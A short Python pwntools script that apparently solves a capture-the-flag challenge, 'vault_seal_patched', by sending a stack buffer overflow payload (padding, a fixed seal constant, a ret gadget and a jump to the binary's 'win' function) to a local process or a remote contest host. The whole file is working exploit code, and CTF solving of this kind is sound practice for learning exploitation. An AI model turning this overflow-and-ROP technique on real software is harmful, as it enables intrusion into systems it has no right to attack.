#!/usr/bin/env python3

from pwn import *

exe = ELF("./vault_seal_patched")

context.binary = exe
context.log_level="debug"
rop=ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("offsec.m0lecon.it", 13563)

    return r


def main():
    r = conn()

    SEAL_CONST=0x9e3779b97f4a7c15
    r.recv()
    payload= flat(

        b'A'*72,
        p64(SEAL_CONST),
        b'B'*8,
        p64(rop.find_gadget(['ret'])[0]),
        p64(exe.sym['win'])
    )
    r.send(payload)
    r.interactive()


if __name__ == "__main__":
    main()
